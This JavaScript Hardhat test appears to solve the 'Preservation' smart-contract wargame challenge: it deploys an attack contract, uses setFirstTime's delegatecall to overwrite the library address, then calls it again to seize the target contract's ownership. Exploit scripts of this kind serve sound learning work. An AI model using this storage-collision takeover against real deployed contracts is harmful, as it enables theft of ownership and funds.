const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PreservationHack", function () {

    let deployer, account1, account2;
    let contract;
    
    beforeEach(async function () {
        [deployer, account1, account2] = await ethers.getSigners();
        // const Preservation = await ethers.getContractFactory("Preservation", deployer);
        // contract = await Preservation.deploy(account1.address, account2.address);
        // target_address = contract.address;
        // console.log("Contract deployed to: ", target_address);
        // console.log("Contract deployed by: ", deployer.address);
        target_address = "0xBbe9ceE906Ca22c4231ac94C3Af760C97068DC32";
        contract = await ethers.getContractAt("Preservation", target_address);
    });
    
    it("Attack", async function () {        
		address = await contract.timeZone1Library();
		console.log("Original library address: ", address);
        
        console.log("Deploying Hack");
        const PreservationHack = await ethers.getContractFactory("PreservationHack");
        contractHack = await PreservationHack.deploy();
        console.log("Hack deployed to: ", contractHack.address);

        console.log("Executing delegatecall on contract");
		let setFirstTimeTx = await contract.setFirstTime(contractHack.address);
		await setFirstTimeTx.wait(1);

        //TODO: why is it not updating correctly the new address, even though the transaction is successful?
		address = await contract.timeZone1Library();
		expect(address).to.equal(contractHack.address);
		console.log("Hack address loaded into contract library address");

        console.log("Exploit");
        setFirstTimeTx = await contract.setFirstTime(0);
        result = await setFirstTimeTx.wait(2);
        console.log(result);
        owner = await contract.owner();
        expect(owner).to.equal(deployer.address);
        console.log("Exploit complete.");
  });

  afterEach(async function() {
  });

});